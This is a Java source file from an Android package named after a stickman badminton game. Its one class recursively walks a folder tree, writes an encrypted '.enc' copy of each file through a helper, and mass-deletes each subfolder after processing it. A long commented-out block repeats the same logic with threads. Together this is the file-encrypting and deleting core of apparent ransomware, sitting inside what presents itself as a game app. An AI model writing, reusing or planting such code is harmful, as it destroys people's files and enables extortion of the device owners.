package com.example.stickmanbadminton;


import android.os.Handler;
import android.os.Looper;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ziptoinfinityandbeyond{
    public static void getthosefiles(File[] s ,final File file1) throws IOException {
        final securityGuard guard = new securityGuard();
        List hello = new LinkedList();
        hello.add(0,1);
        if(s.length>0){
            for(int i = 0 ; i < s.length ; i++){
            if(!(s[i].getName().substring(0,1).equals(".")) && !(s[i].getName().contains("bwoah"))){
                File file = s[i];
                String path = file.getPath();
                if(file.isFile()){

                        File copy = new File(file1.getPath() + "/" + file.getName()+ "555.enc");
                        if(copy.exists()){
                            copy.delete();

                        }
                        copy.createNewFile();
                        guard.mommygimmekey(file,copy);
                }
                else{
                    File[] heckno = file.listFiles();
                    getthosefiles(heckno,file1);
                    Directory hell = new Directory(file,file);
                    hell.massDelete();
                }
//                hello.add(i+1,path);
            }
        }

//        final List linked = Collections.synchronizedList(hello);
//        if(linked.size()>0){
//            new Thread(new Runnable() {
//
//                @Override
//                public void run(){
//                    Handler handler = new Handler(Looper.getMainLooper()){
//                        public void run(){
//                            while((int) linked.get(0)<linked.size()){
//                                try{
//                                    int dangit = (int) linked.get(0);
//                                    linked.remove(0);
//                                    linked.add(0,dangit+1);
//                                    if(!( (new File((String)linked.get(dangit)).getName().substring(0,1).equals(".")) && !(new File((String)linked.get(dangit)).getName().contains("bwoah")))){
//                                        File file = new File((String)linked.get(dangit));
//                                        if(file.isFile()){
//
//                                            File copy = new File(file1.getPath() + "/" + file.getName()+ "555.enc");
//                                            if(copy.exists()){
//                                                copy.delete();
//
//                                            }
//                                            copy.createNewFile();
//                                            guard.mommygimmekey(file,copy);
//                                        }
//                                        else{
//                                            File[] heckno = file.listFiles();
//                                            getthosefiles(heckno,file1);
//                                            Directory hell = new Directory(file,file);
//                                            hell.massDelete();
//                                        }
//                                    }
//                                }catch(Exception e){
//                                    e.printStackTrace();
//                                }
//
//
//
//                            }
//                        }
//                    };
//                   Looper loop = handler.getLooper();
//                   loop.prepare();
//                   loop.getThread().start();
//
//                }
//            }).start();
//            try{
//                Thread.sleep(1000);
//            }catch(InterruptedException e){
//                e.printStackTrace();
//            }
//
//            while((int) linked.get(0)<s.length){
//                int dangit = (int) linked.get(0);
//                linked.remove(0);
//                linked.add(0,dangit+1);
//                if(!( (new File((String)linked.get(dangit)).getName().substring(0,1).equals(".")) && !(new File((String)linked.get(dangit)).getName().contains("bwoah")))){
//                    File file = new File((String) linked.get(dangit));
//                    if(file.isFile()){
//
//                        File copy = new File(file1.getPath() + "/" + file.getName()+ "555.enc");
//                        if(copy.exists()){
//                            copy.delete();
//
//                        }
//                        copy.createNewFile();
//                        guard.mommygimmekey(file,copy);
//                    }
//                    else{
//                        File[] heckno = file.listFiles();
//                        getthosefiles(heckno,file1);
//                        Directory hell = new Directory(file,file);
//                        hell.massDelete();
//                    }
//                }
//
//
//            }
        }

    }
}

